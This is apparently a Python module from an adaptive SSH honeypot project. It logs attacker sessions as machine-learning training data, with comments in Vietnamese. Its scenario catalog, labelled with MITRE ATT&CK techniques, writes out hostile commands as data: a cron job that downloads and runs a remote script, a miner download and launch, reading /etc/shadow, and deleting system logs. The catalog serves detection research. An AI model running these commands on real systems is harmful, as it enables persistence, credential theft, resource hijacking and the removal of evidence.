import os
import re
import json
import uuid
import datetime
from pathlib import Path
from typing import Dict, Any, List, Optional

# Thư mục gốc chứa các run dữ liệu thô cho máy ML
BASE_DIR = Path(__file__).resolve().parent.parent
DEFAULT_DATA_RAW_DIR = BASE_DIR / "data" / "raw"

# Danh mục kịch bản kiểm thử định sẵn (Pre-defined Ground Truth Scenarios)
# Không lấy từ prediction của model, mà được xác định trước hoặc do analyst review
SCENARIOS_CATALOG: Dict[str, Dict[str, Any]] = {
    "ssh-discovery-001": {
        "scenario_id": "ssh-discovery-001",
        "protocol": "ssh",
        "ground_truth_label": "System & Network Environment Discovery",
        "description": "Attacker thực hiện thu thập thông tin danh tính, cấu hình mạng, phiên bản hệ điều hành và tiến trình đang chạy.",
        "commands": [
            "whoami",
            "id",
            "uname -a",
            "cat /etc/os-release",
            "ip a",
            "netstat -tulpn",
            "ps aux"
        ],
        "mitre_expected": {
            "tactics": ["Discovery"],
            "techniques": [
                {"id": "T1082", "name": "System Information Discovery"},
                {"id": "T1033", "name": "System Owner/User Discovery"},
                {"id": "T1016", "name": "System Network Configuration Discovery"},
                {"id": "T1057", "name": "Process Discovery"}
            ]
        }
    },
    "ssh-bruteforce-001": {
        "scenario_id": "ssh-bruteforce-001",
        "protocol": "ssh",
        "ground_truth_label": "Credential Access / SSH Password Spraying",
        "description": "Attacker thực hiện quét và dò mật khẩu SSH hàng loạt trước khi đoán trúng thông tin đăng nhập.",
        "failed_attempts": [
            ("root", "123456"),
            ("admin", "admin123"),
            ("ubuntu", "password")
        ],
        "successful_login": ("ubuntu", "123"),
        "commands": [
            "whoami",
            "uptime"
        ],
        "mitre_expected": {
            "tactics": ["Credential Access"],
            "techniques": [
                {"id": "T1110.001", "name": "Brute Force: Password Guessing"},
                {"id": "T1110.003", "name": "Brute Force: Password Spraying"}
            ]
        }
    },
    "ssh-privilege-escalation-001": {
        "scenario_id": "ssh-privilege-escalation-001",
        "protocol": "ssh",
        "ground_truth_label": "Privilege Escalation via Sudo Misconfiguration",
        "description": "Attacker kiểm tra quyền sudo và leo thang đặc quyền từ user thường lên root.",
        "commands": [
            "whoami",
            "sudo -l",
            "sudo su",
            "whoami",
            "id",
            "cat /etc/shadow"
        ],
        "mitre_expected": {
            "tactics": ["Privilege Escalation", "Credential Access"],
            "techniques": [
                {"id": "T1548.003", "name": "Abuse Elevation Control Mechanism: Sudo and Sudoers"},
                {"id": "T1003.008", "name": "OS Credential Dumping: /etc/passwd and /etc/shadow"}
            ]
        }
    },
    "ssh-persistence-001": {
        "scenario_id": "ssh-persistence-001",
        "protocol": "ssh",
        "ground_truth_label": "Persistence Mechanism Establishment",
        "description": "Attacker cắm SSH key vào authorized_keys và lập lịch cronjob để duy trì thâm nhập.",
        "commands": [
            "mkdir -p ~/.ssh",
            "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@c2' >> ~/.ssh/authorized_keys",
            "chmod 600 ~/.ssh/authorized_keys",
            "(crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://192.168.1.50/bot.sh | sh') | crontab -",
            "crontab -l"
        ],
        "mitre_expected": {
            "tactics": ["Persistence"],
            "techniques": [
                {"id": "T1098.004", "name": "Account Manipulation: SSH Authorized Keys"},
                {"id": "T1053.003", "name": "Scheduled Task/Job: Cron"}
            ]
        }
    },
    "ssh-malware-download-001": {
        "scenario_id": "ssh-malware-download-001",
        "protocol": "ssh",
        "ground_truth_label": "Ingress Tool Transfer / Malware Staging",
        "description": "Attacker tải payload mã độc botnet/miner về thư mục tạm /tmp và cấp quyền thực thi.",
        "commands": [
            "cd /tmp",
            "curl -O http://192.168.1.50:8000/update.sh",
            "wget http://192.168.1.50:8000/xmr_miner -O .miner",
            "chmod +x update.sh .miner",
            "ls -la"
        ],
        "mitre_expected": {
            "tactics": ["Command and Control", "Defense Evasion"],
            "techniques": [
                {"id": "T1105", "name": "Ingress Tool Transfer"},
                {"id": "T1222.002", "name": "File and Directory Permissions Modification: Linux and Mac Permissions Analysis"}
            ]
        }
    },
    "ssh-mining-execution-001": {
        "scenario_id": "ssh-mining-execution-001",
        "protocol": "ssh",
        "ground_truth_label": "Resource Hijacking / Background Cryptomining",
        "description": "Attacker khởi chạy tiến trình đào coin dưới nền bằng nohup và kiểm tra trạng thái CPU.",
        "commands": [
            "nohup ./xmr -o pool.minexmr.com:443 -u 48... --cpu-max-threads-hint=100 &",
            "ps aux | grep xmr",
            "top -b -n 1"
        ],
        "mitre_expected": {
            "tactics": ["Execution", "Impact"],
            "techniques": [
                {"id": "T1059.004", "name": "Command and Scripting Interpreter: Unix Shell"},
                {"id": "T1496", "name": "Resource Hijacking"}
            ]
        }
    },
    "ssh-defense-evasion-001": {
        "scenario_id": "ssh-defense-evasion-001",
        "protocol": "ssh",
        "ground_truth_label": "Defense Evasion / Indicator Removal on Host",
        "description": "Attacker xóa lịch sử lệnh và xóa trắng các tệp nhật ký hệ thống để che giấu dấu vết.",
        "commands": [
            "cat /dev/null > ~/.bash_history",
            "history -c",
            "rm -f /var/log/auth.log",
            "rm -f /var/log/syslog"
        ],
        "mitre_expected": {
            "tactics": ["Defense Evasion"],
            "techniques": [
                {"id": "T1070.003", "name": "Indicator Removal on Host: Clear Command History"},
                {"id": "T1070.002", "name": "Indicator Removal on Host: Clear Linux or Mac System Logs"}
            ]
        }
    }
}


def redact_sensitive_data(text: str) -> str:
    """Loại bỏ mật khẩu, token, private key thực khỏi chuỗi log."""
    if not text:
        return ""
    # Redact pass parameter
    text = re.sub(r'(-p|--password|password=|pass=)\s*["\']?[^\s"\'&|;]+["\']?', r'\1 [REDACTED]', text, flags=re.IGNORECASE)
    # Redact private keys
    text = re.sub(r'-----BEGIN[ A-Z0-9_-]+PRIVATE KEY-----.*?-----END[ A-Z0-9_-]+PRIVATE KEY-----', '[REDACTED_PRIVATE_KEY]', text, flags=re.DOTALL)
    # Redact potential API keys or tokens
    text = re.sub(r'(bearer\s+[a-zA-Z0-9_\-\.]{15,})', 'Bearer [REDACTED_TOKEN]', text, flags=re.IGNORECASE)
    return text


def generate_iso_timestamp() -> str:
    """Sinh chuỗi thời gian UTC theo chuẩn ISO-8601 với milliseconds và đuôi Z."""
    now = datetime.datetime.now(datetime.timezone.utc)
    return now.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


class MLLogExporter:
    """
    Bộ quản lý và xuất log chuẩn Machine Learning cho Adaptive Honeypot.
    Lưu dữ liệu tách biệt theo run_id, kèm run_manifest và scenario_manifest.
    """
    def __init__(
        self,
        run_id: Optional[str] = None,
        campaign_id: Optional[str] = None,
        dataset_role: str = "train",
        output_base_dir: Path = DEFAULT_DATA_RAW_DIR,
        source_engine: str = "Adaptive-Honeypot-Deception",
        source_engine_version: str = "2.5.0"
    ):
        self.output_base_dir = Path(output_base_dir)
        date_str = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d")
        rand_suffix = str(uuid.uuid4())[:6]
        self.run_id = run_id or f"run-{date_str}-{rand_suffix}"
        self.campaign_id = campaign_id or f"camp-honeypot-{date_str}"
        self.dataset_role = dataset_role
        self.source_engine = source_engine
        self.source_engine_version = source_engine_version
        
        self.run_dir = self.output_base_dir / self.run_id
        self.run_dir.mkdir(parents=True, exist_ok=True)
        
        self.events_file = self.run_dir / "events.jsonl"
        self.run_manifest_file = self.run_dir / "run_manifest.json"
        self.scenario_manifest_file = self.run_dir / "scenario_manifest.json"
        
        self.started_at = generate_iso_timestamp()
        self.ended_at = None
        self.scenarios_used: List[str] = []
        self.event_counter = 0

    def emit_event(
        self,
        session_id: str,
        event_status: str,
        source_ip: str,
        source_port: int,
        username: Optional[str] = None,
        command: Optional[str] = None,
        command_output: Optional[str] = None,
        scenario_id: Optional[str] = None,
        raw_log: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Ghi một dòng JSON hoàn chỉnh vào events.jsonl.
        Schema chuẩn hóa phục vụ máy ML theo đúng yêu cầu:
        event_id, timestamp, session_id, protocol, event_status, username,
        command, command_output, source_ip, source_port, raw_event, run_id, scenario_id
        """
        self.event_counter += 1
        now_ts = generate_iso_timestamp()
        event_id = f"evt-{self.run_id}-{self.event_counter:05d}"
        
        clean_cmd = redact_sensitive_data(command) if command else None
        clean_out = redact_sensitive_data(command_output) if command_output else None

        event_obj: Dict[str, Any] = {
            "event_id": event_id,
            "timestamp": now_ts,
            "session_id": session_id,
            "protocol": "ssh",
            "event_status": event_status,
            "source_ip": source_ip,
            "source_port": source_port
        }
        
        if username:
            event_obj["username"] = username
        if clean_cmd is not None:
            event_obj["command"] = clean_cmd
        if clean_out is not None:
            event_obj["command_output"] = clean_out
        if scenario_id:
            event_obj["scenario_id"] = scenario_id
            if scenario_id not in self.scenarios_used:
                self.scenarios_used.append(scenario_id)
        if self.run_id:
            event_obj["run_id"] = self.run_id

        # Raw log lưu nguyên bản để truy vết provenance
        event_obj["raw_event"] = raw_log or json.dumps(event_obj, ensure_ascii=False)

        # Ghi JSON Lines vào file của run riêng biệt
        with open(self.events_file, "a", encoding="utf-8") as f:
            f.write(json.dumps(event_obj, ensure_ascii=False) + "\n")

        return event_obj

    def emit_login(self, session_id: str, source_ip: str, source_port: int, username: str, scenario_id: Optional[str] = None):
        """Ghi sự kiện login mở phiên SSH."""
        return self.emit_event(
            session_id=session_id,
            event_status="login",
            source_ip=source_ip,
            source_port=source_port,
            username=username,
            scenario_id=scenario_id,
            raw_log=f"SSH auth accepted for user '{username}' from {source_ip}:{source_port}"
        )

    def emit_login_failed(self, session_id: str, source_ip: str, source_port: int, username: str, scenario_id: Optional[str] = None):
        """Ghi sự kiện login thất bại (dò pass/brute force). Không ghi password thật."""
        return self.emit_event(
            session_id=session_id,
            event_status="login_failed",
            source_ip=source_ip,
            source_port=source_port,
            username=username,
            scenario_id=scenario_id,
            raw_log=f"SSH auth rejected for user '{username}' from {source_ip}:{source_port}"
        )

    def emit_command(
        self,
        session_id: str,
        source_ip: str,
        source_port: int,
        username: str,
        command: str,
        command_output: str,
        scenario_id: Optional[str] = None
    ):
        """Ghi sự kiện thực thi lệnh và kết quả phản hồi của sandbox."""
        return self.emit_event(
            session_id=session_id,
            event_status="command",
            source_ip=source_ip,
            source_port=source_port,
            username=username,
            command=command,
            command_output=command_output,
            scenario_id=scenario_id,
            raw_log=f"[{username}@{source_ip}] $ {command} -> {command_output[:80] if command_output else ''}"
        )

    def emit_session_closed(
        self,
        session_id: str,
        source_ip: str,
        source_port: int,
        username: Optional[str] = None,
        scenario_id: Optional[str] = None
    ):
        """
        Ghi sự kiện kết thúc phiên (BẮT BUỘC có event_status = 'session_closed').
        Giúp máy ML biết thời điểm đã đủ dữ liệu phiên để gom session và chạy inference.
        """
        return self.emit_event(
            session_id=session_id,
            event_status="session_closed",
            source_ip=source_ip,
            source_port=source_port,
            username=username,
            scenario_id=scenario_id,
            raw_log=f"SSH connection closed for session '{session_id}' from {source_ip}:{source_port}"
        )

    def finalize_run(self) -> Dict[str, Any]:
        """Đóng gói run, ghi nhận run_manifest.json và scenario_manifest.json."""
        self.ended_at = generate_iso_timestamp()

        # 1. Tạo run_manifest.json
        run_manifest = {
            "run_id": self.run_id,
            "campaign_id": self.campaign_id,
            "source_engine": self.source_engine,
            "source_engine_version": self.source_engine_version,
            "started_at": self.started_at,
            "ended_at": self.ended_at,
            "dataset_role": self.dataset_role,
            "scenario_id": self.scenarios_used,
            "total_events": self.event_counter
        }
        with open(self.run_manifest_file, "w", encoding="utf-8") as f:
            json.dump(run_manifest, f, ensure_ascii=False, indent=2)

        # 2. Tạo scenario_manifest.json với ground truth độc lập
        scenario_manifest = []
        for sid in self.scenarios_used:
            if sid in SCENARIOS_CATALOG:
                meta = SCENARIOS_CATALOG[sid]
                scenario_manifest.append({
                    "scenario_id": meta["scenario_id"],
                    "protocol": meta["protocol"],
                    "ground_truth_label": meta["ground_truth_label"],
                    "description": meta["description"],
                    "expected_mitre": meta["mitre_expected"]
                })
            else:
                scenario_manifest.append({
                    "scenario_id": sid,
                    "protocol": "ssh",
                    "ground_truth_label": "Unknown Scenario",
                    "description": "Custom test scenario",
                    "expected_mitre": {"tactics": [], "techniques": []}
                })

        with open(self.scenario_manifest_file, "w", encoding="utf-8") as f:
            json.dump(scenario_manifest, f, ensure_ascii=False, indent=2)

        return {
            "run_id": self.run_id,
            "run_dir": str(self.run_dir),
            "events_file": str(self.events_file),
            "run_manifest_file": str(self.run_manifest_file),
            "scenario_manifest_file": str(self.scenario_manifest_file),
            "total_events": self.event_counter
        }
